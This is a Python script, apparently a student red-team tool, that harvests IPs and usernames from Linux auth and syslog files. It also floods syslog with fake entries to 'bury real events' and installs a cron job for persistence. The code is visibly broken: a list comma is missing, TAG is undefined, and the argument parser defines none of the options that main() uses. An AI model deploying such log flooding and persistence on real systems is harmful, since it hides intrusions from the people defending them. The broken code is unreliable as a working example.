#!/usr/bin/env python3
# Seonho Park, scp4941@rit.edu

import os, re, sys, json, time, socket, argparse, hashlib, threading, subprocess, pwd, grp
from datetime import datetime, timezone
from pathlib import Path
from collections import defaultdict
import logging
from logging.handlers import SysLogHandler

# ---------------- CONFIG ----------------

MAX_RATE = 50          # max messages/sec as a DOS safeguard
MAX_DURATION = 300     # seconds; 300s = 5 min cap

DEFAULT_LOGS = [
    "/var/log/syslog",
    "/var/log/auth.log",
    "/var/log/messages"
    "/var/log/secure",
]
STORAGE_DIR = Path("./rt_logs")
SYSLOG_SOCKET = "/dev/log"

# ---------------- ENV ----------------

def is_root():
    return os.geteuid() == 0

def readable_logs(paths):

    readable_files = []
    
    for path in paths:
        # Check if the path points to an actual file
        if not os.path.isfile(path):
            continue
            
        # Check if the file is readable by the current user
        if not os.access(path, os.R_OK):
            continue
            
        readable_files.append(path)
    
    return readable_files

def current_user_info() -> dict:
    """
    Return the current process's user/group info via pwd/grp (Linux stdlib).
    """
    uid = os.geteuid()
    gid = os.getegid()
    try:
        uname = pwd.getpwuid(uid).pw_name
    except KeyError:
        uname = str(uid)
    try:
        gname = grp.getgrgid(gid).gr_name
    except KeyError:
        gname = str(gid)
    return {"uid": uid, "gid": gid, "user": uname, "group": gname}

# ---------------- LOG READING ----------------

def read_logs(paths):
    entries = []
    for p in readable_logs(paths):
        try:
            with open(p, errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        entries.append((p, line))
        except:
            continue
    return entries

# ---------------- ANALYSIS ----------------

IP_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
USER_RE = re.compile(r"user(?:name)?[=:\s]+([a-zA-Z0-9_@.-]+)", re.I)
FAIL_RE = re.compile(
    r"(failed|failure|invalid|unauthorized|denied|error|refused|rejected)",
    re.I,
)
PORT_RE = re.compile(r"\bport\s+(\d{1,5})\b", re.I)

def analyze(paths, keywords):
    findings = []

    for path, line in read_logs(paths):
        ips = IP_RE.findall(line)
        users = USER_RE.findall(line)
        ports = PORT_RE.findall(line)
        flags = []
        kws = [k for k in keywords if k.lower() in line.lower()]

        if FAIL_RE.search(line):
            flags.append("failure")

        if ips or users or kws or flags:
            findings.append({
                "source": path,
                "line": line,
                "time": datetime.utcnow().isoformat(),
                "ips": ips,
                "users": users,
                "ports": ports,
                "keywords": kws,
                "flags": flags,
                "hash": hashlib.sha256(line.encode()).hexdigest()
            })

    return findings

# ---------------- STORAGE ----------------

def save_findings(data, folder):
    folder.mkdir(exist_ok=True)
    name = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    file = folder / f"findings_{name}.json"

    with open(file, "w") as f:
        json.dump(data, f, indent=2)

    return file

def load_findings(folder):
    results, seen = [], set()

    if not folder.exists():
        return results

    for f in folder.glob("findings_*.json"):
        try:
            data = json.load(open(f))
            for item in data:
                if item["hash"] not in seen:
                    seen.add(item["hash"])
                    results.append(item)
        except:
            continue

    return results

# ---------------- SUMMARY ----------------

def summarize(findings: list) -> dict:
    """
    Produce a concise situational-awareness summary of collected findings.
    """
    ip_counts     = defaultdict(int)
    user_counts   = defaultdict(int)
    flag_counts   = defaultdict(int)
    svc_counts    = defaultdict(int)
    source_counts = defaultdict(int)

    for f in findings:
        for ip   in f.get("ips",   []):
            ip_counts[ip] += 1
        for user in f.get("users", []):
            user_counts[user] += 1
        for flag in f.get("flags", []):
            flag_counts[flag] += 1
        svc = f.get("service")
        if svc:
            svc_counts[svc[0]] += 1
        source_counts[f["source"]] += 1

    return {
        "total_findings":   len(findings),
        "top_ips":          sorted(ip_counts.items(),   key=lambda x: -x[1])[:10],
        "top_users":        sorted(user_counts.items(), key=lambda x: -x[1])[:10],
        "top_services":     sorted(svc_counts.items(),  key=lambda x: -x[1])[:10],
        "flag_counts":      dict(flag_counts),
        "findings_by_file": dict(source_counts),
    }
# ---------------- FLOOD ----------------

def _setup_syslog_logger() -> logging.Logger:
    """
    Configure a logger that writes to /dev/log (Linux syslog Unix socket).
    rsyslog and syslog-ng both listen on this socket on all major distros.
    """
    logger  = logging.getLogger("rt_flooder")
    logger.setLevel(logging.INFO)
    handler = SysLogHandler(address=SYSLOG_SOCKET)
    handler.setFormatter(logging.Formatter(f"{TAG}: %(message)s"))
    logger.addHandler(handler)
    return logger


def flood_logs(rate: int, duration: int) -> None:
    """
    Write synthetic syslog entries at a controlled rate to bury real events.

    Rate and duration are capped at MAX_RATE / MAX_DURATION regardless of
    caller input.  Uses time.monotonic() to avoid wall-clock drift.
    """
    rate     = min(rate, MAX_RATE)
    duration = min(duration, MAX_DURATION)
    logger   = _setup_syslog_logger()
    interval = 1.0 / rate
    deadline = time.monotonic() + duration
    counter  = 0

    print(f"[+] Flooding syslog at {rate} msg/sec for {duration}s …")

    while time.monotonic() < deadline:
        logger.info(
            f"simulation_event id={counter} "
            f"ts={datetime.now(timezone.utc).isoformat()} "
            f"status=ok src=127.0.0.1 dst=10.0.0.1"
        )
        counter += 1
        time.sleep(interval)

    print(f"[+] Flood complete — {counter} entries written")


# ---------------- CRON ----------------

def persist(script):
    job = f"*/5 * * * * python3 {script}\n"
    current = subprocess.getoutput("crontab -l 2>/dev/null")

    if job not in current:
        subprocess.run(["crontab", "-"], input=current + job, text=True)
        print("[+] Cron added")

def unpersist(script):
    job = f"*/5 * * * * python3 {script}\n"
    current = subprocess.getoutput("crontab -l")

    subprocess.run(["crontab", "-"], input=current.replace(job, ""), text=True)
    print("[+] Cron removed")

# ---------------- CLI ------------------
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog = "log_flooder.py",
        description="Log collection and flooding tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="TODO: bleh >w<"
    )
    
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    storage_dir = Path(args.storage_dir)
    ui = current_user_info()

    print(f"[+] log_tool.py | user={ui['user']} uid={ui['uid']} | Linux")

    if args.raw:
        print("[+] Reading raw log entries …")
        entries = read_logs(args.logs)
        for path, line in entries[:100]:
            print(f"  [{path}] {line}")
        print(f"[+] {len(entries)} total raw entries")

    findings = []
    if args.collect:
        print(f"[+] Analysing logs — keywords: {args.keywords}")
        findings = analyze(args.logs, args.keywords)
        print(f"[+] {len(findings)} findings extracted")
        for f in findings[:50]:
            tags    = f["keywords"] + f["flags"]
            svc     = f["service"]
            svc_str = f"{svc[0]}[{svc[1]}]" if svc else "?"
            print(f"  [{f['source']}] {svc_str} [{', '.join(tags) or '—'}] {f['line'][:110]}")

    if args.save:
        if findings:
            out = save_findings(findings, storage_dir)
            print(f"[+] Findings saved → {out}  (chmod 600)")
        else:
            print("[*] Nothing to save — run --collect first")

    if args.flood:
        if not is_root():
            print("[-] --flood requires root (uid 0)")
            sys.exit(1)
        if not Path(SYSLOG_SOCKET).exists():
            print(f"[-] {SYSLOG_SOCKET} not found — is rsyslog/syslog-ng running?")
            sys.exit(1)
        flood_logs(args.rate, args.duration)


if __name__ == "__main__":
    main()
